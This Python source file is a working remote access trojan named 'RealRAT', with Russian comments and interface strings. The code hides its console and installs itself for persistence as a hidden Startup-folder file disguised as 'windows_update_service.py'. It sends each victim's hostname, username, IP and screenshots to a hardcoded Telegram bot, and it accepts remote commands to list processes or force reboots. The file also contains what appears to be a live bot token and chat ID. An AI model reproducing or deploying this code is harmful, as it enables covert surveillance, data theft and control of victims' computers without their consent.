import os
import platform
import requests
import subprocess
import time
import shutil
import socket
import sys

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
CHAT_ID = "-1003442349627"

class RealRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.victim_id = socket.gethostname()
        self.last_update_id = 0
        
    def hide_console(self):
        try:
            if platform.system().startswith("Windows"):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def setup_persistence(self):
        """Добавляем в автозагрузку и запускаем"""
        try:
            if platform.system().startswith("Windows"):
                appdata = os.getenv('APPDATA')
                startup_dir = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                script_path = os.path.abspath(__file__)
                target_path = os.path.join(startup_dir, 'windows_update_service.py')
                
                # Копируем себя в автозагрузку
                if not os.path.exists(target_path):
                    shutil.copy2(script_path, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
                
                # ЗАПУСКАЕМ СЕБЯ ИЗ АВТОЗАГРУЗКИ
                subprocess.Popen(['python', target_path], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
                    
        except Exception as e:
            print(f"Ошибка автозагрузки: {e}")

    def send_to_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                'chat_id': self.chat_id,
                'text': text
            }
            requests.get(url, params=params, timeout=10)
        except:
            pass

    def send_file_to_telegram(self, filename):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(filename, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}
                requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

    def send_keyboard(self):
        """Отправляем клавиатуру с кнопками"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            keyboard = {
                'keyboard': [
                    [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                    [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}]
                ],
                'resize_keyboard': True
            }
            params = {
                'chat_id': self.chat_id,
                'text': f'🎯 НОВАЯ ЖЕРТВА: {self.victim_id}\nВыберите действие:',
                'reply_markup': keyboard
            }
            response = requests.post(url, json=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    self.last_update_id = data['result']['update_id']
        except Exception as e:
            print(f"Ошибка клавиатуры: {e}")

    def collect_system_info(self):
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
            
            info = f"""💻 НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!

🖥️ Компьютер: {self.victim_id}
👤 Пользователь: {os.getlogin()}
🌐 IP адрес: {ip}
⚙️ Система: {platform.system()} {platform.release()}
📁 Директория: {os.getcwd()}

🚀 RAT активирована!"""
            
            return info
        except:
            return f"🎯 НОВАЯ ЖЕРТВА!\nКомпьютер: {self.victim_id}\nПользователь: {os.getlogin()}"

    def take_screenshot(self):
        try:
            file_path = "screen.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            self.send_file_to_telegram(file_path)
            os.remove(file_path)
            return True
        except:
            return False

    def get_processes(self):
        try:
            if platform.system().startswith("Windows"):
                result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT)
            else:
                result = subprocess.check_output('ps aux', shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore').strip()[:3000]
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def uninstall_rat(self):
        """Удаляем RAT"""
        try:
            if platform.system().startswith("Windows"):
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                rat_path = os.path.join(startup_dir, 'windows_update_service.py')
                if os.path.exists(rat_path):
                    os.remove(rat_path)
            return True
        except:
            return False

    def execute_command(self, command):
        try:
            if command == '📸 Скриншот':
                self.take_screenshot()
                return "📸 Скриншот отправлен!"
                
            elif command == '💻 Информация':
                return self.collect_system_info()
                
            elif command == '🌐 IP адрес':
                ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
                return f"🌐 IP адрес: {ip}"
                
            elif command == '📊 Процессы':
                processes = self.get_processes()
                return f"📊 Запущенные процессы:\n{processes}"
                
            elif command == '🔄 Перезагрузить':
                if platform.system().startswith("Windows"):
                    os.system('shutdown /r /t 10')
                    return "🔄 Перезагрузка через 10 секунд!"
                else:
                    os.system('shutdown -r +1')
                    return "🔄 Перезагрузка через 1 минуту!"
                    
            elif command == '🗑️ Удалить RAT':
                if self.uninstall_rat():
                    return "🗑️ RAT удалена из автозагрузки! Завершение работы..."
                else:
                    return "❌ Ошибка удаления RAT"
                    
            else:
                return "❌ Неизвестная команда"
                
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def check_commands(self):
        """Проверяем только НОВЫЕ команды от бота"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            params = {'offset': self.last_update_id + 1, 'timeout': 10}
            response = requests.get(url, params=params, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    for update in data['result']:
                        update_id = update['update_id']
                        
                        # Обновляем ID последнего сообщения
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        
                        # Обрабатываем только если есть сообщение с текстом
                        if 'message' in update and 'text' in update['message']:
                            message_text = update['message']['text']
                            
                            # Обрабатываем команды с кнопок
                            if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                              '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                result = self.execute_command(message_text)
                                self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                
                                # Если удаляем RAT - завершаем работу
                                if message_text == '🗑️ Удалить RAT':
                                    time.sleep(2)
                                    sys.exit(0)
                            
        except Exception as e:
            print(f"Ошибка проверки команд: {e}")

    def start(self):
        # Скрываем консоль
        self.hide_console()
        
        # Устанавливаем автозагрузку И ЗАПУСКАЕМСЯ
        self.setup_persistence()
        
        # Ждем немного для стабильности
        time.sleep(5)
        
        # Отправляем уведомление о подключении
        system_info = self.collect_system_info()
        self.send_to_telegram(system_info)
        
        # Отправляем клавиатуру
        time.sleep(2)
        self.send_keyboard()
        
        # Делаем первый скриншот
        time.sleep(3)
        self.take_screenshot()
        
        print("RAT запущена и работает...")
        
        # Основной цикл
        while True:
            try:
                self.check_commands()
                time.sleep(3)
            except Exception as e:
                print(f"Ошибка главного цикла: {e}")
                time.sleep(10)

if __name__ == '__main__':
    # Проверяем не запущены ли мы уже из автозагрузки
    current_file = os.path.abspath(__file__)
    startup_file = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update_service.py')
    
    # Если мы НЕ из автозагрузки - копируем и запускаем оттуда
    if current_file != startup_file and os.path.exists(startup_file):
        # Запускаем версию из автозагрузки
        subprocess.Popen(['python', startup_file], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    else:
        # Запускаем текущую версию
        rat = RealRAT()
        rat.start()
